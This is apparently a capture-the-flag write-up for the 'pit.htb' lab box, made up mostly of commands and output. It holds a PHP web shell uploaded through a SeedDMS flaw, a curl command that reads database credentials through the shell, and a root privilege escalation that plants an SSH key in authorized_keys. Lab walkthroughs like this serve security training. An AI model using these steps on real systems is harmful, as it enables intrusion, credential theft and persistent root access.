### Nmap
```txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6fc3408f6950695a57d79c4e7b1b9496 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9CvWa9xl1PXPQEI4X8UIfiDKduW+NhC0tRtfKzBSIR0XE+n2MjNCLM6pAR4xwhPZcpkXQmwurayT3OOHPV5QpOdSfzp0Zv56sBn3FmYe9j6fuhRFFL2x6Q8NfHOFkd4tAwkcCB1EebD0S/1ajB+TO6WeMOIHEU9HAAyg2LDzUKh0pzfFdK2MQHzKrGcFe3kOalz/dRJApa9wzUgq6iDbQvstDucPFLmvu8Y4YKFg1trKnf4Z2kopSUn0kKOxBROddoKOBdTyE309PF1b/Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr/NwWDsVQwHgCf1M7EZ23Uxww/qE6vRWbHStc6gM=
|   256 c26ff8aba12083d160abcf632dc865b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVAa/9rmFNvMuiMvBTPWhPq2+b5apFURHdxW2S5Q=
|   256 6b656ca692e5cc76175a2f9ae750c350 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp open  http    syn-ack nginx 1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
|_http-server-header: nginx/1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 4ca7e41263c5985e00000000
|   snmpEngineBoots: 76
|_  snmpEngineTime: 2h39m51s
| snmp-sysdescr: Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
|_  System uptime: 2h39m51.19s (959119 timeticks)
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent time


```

### Port 161
```bash


# enum snmp
snmpwalk -c public -v2c $IP . | tee snmp_enum.output

# get snmp strings
# snmpbulkwalk -c public -v2c $IP . | grep 'STRING: ' | grep -oP '\".*?\"' | tr -d '"' > snmp_strings.txt

# found interesting string (there's a web running seeddms)
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
```

### Web Exploit
```bash
# found login portal
http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F

# login seeddms
michelle:michelle

# analysis changelog
--------------------------------------------------------------------------------
                     Changes in version 5.1.11
--------------------------------------------------------------------------------
- fix for CVE-2019-12744 (Remote Command Execution through unvalidated
  file upload), add .htaccess file to data directory, better documentation
  for installing seeddms
- fix for CVE-2019-12745 (Persistent or Stored XSS in UsrMgr) and
  CVE-2019-12801 (Persistent or Stored XSS in GroupMgr), propperly escape
  strings used in Select2 js library used by UsrMgr and GroupMgr
- do not show attributes in search results in extra column anymore
- fix setting language during login (Closes #437)
- fix indexing documents even if no preIndexDocument hook is set (Closes #437)
- fix moving documents on the clipboard into the current folder
- new hook 'footNote' in class Bootstrap

# keypoint nginx doesnt have .htaccess, then we can still exploit in this way
SeedDMS versions < 5.1.11 - Remote Command Execution   | php/webapps/47022.txt

# upload backdoor
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

# found db cred
curl "http://dms-pit.htb/seeddms51x/data/1048576/39/1.php?cmd=$(urlencode -m 'cd ../../../conf; ls -las; cat settings.xml 2>&1;')"

<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">

# login https://pit.htb:9090/system (what we found early)
michelle:ied^ieY6xoquu

# get shell by the terminal provided

```

### Priv Esc
```bash
# found the target is running minitor with snmp
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"

# found monitor can run all script with a specified pattern
cat /usr/bin/monitor

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done

# create key
ssh-keygen -f pit

# add file to the dir and waitting for being triggered
echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCviL9V0WK4nQSC7prtCv+fyDhPVXDbH2+gyeKJbZLlOfYDrCngfZ6Z9woU8z+hDnWvFh+qYGjcw0LpfpkbB+2qLu+3nzWukRLSDpxTdDWdaIzPMmIw0ReSdPDvwKkeZLsA99c5OBJ9FVFjoTAAxnENrN5mYf8tBacYKbQlj+uzUQkS+96AcXZzypOLVhYavMdTt54Hu/amgCsTsg1Jot85ekeelHI6ZAPIg0Ind6cOk8AI6VNdDYcXx3SpD05yPsGYPTpmWT8dtE851Rd1dAD7krO44xi76La/Q7NilDzPgjPGnKEhnKX9yntFs/+ecMk86jvdB4WoeYQ/gSi1OxJdnJcm+sD9aVfTeCgKvclqbeGe9rxoNx88A6OztPRaTKVuLE8g7bAuwlbo6HdUA10LhYPBzjO0tco/UyR5G+F/PPQ7yBaVJf8Iq4INcbgIlzWqyiovZEywj4Y8mYtWY0YbCZ7piozCEKeCMf0Vtpc2y5IgbK01wlerUdJjHaOhRe0= nobody@nothing' > /root/.ssh/authorized_keys; echo 'Success' " > check_addRootKey.sh

# trigger monitoting
snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects

# get root access
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i pit root@$IP




```
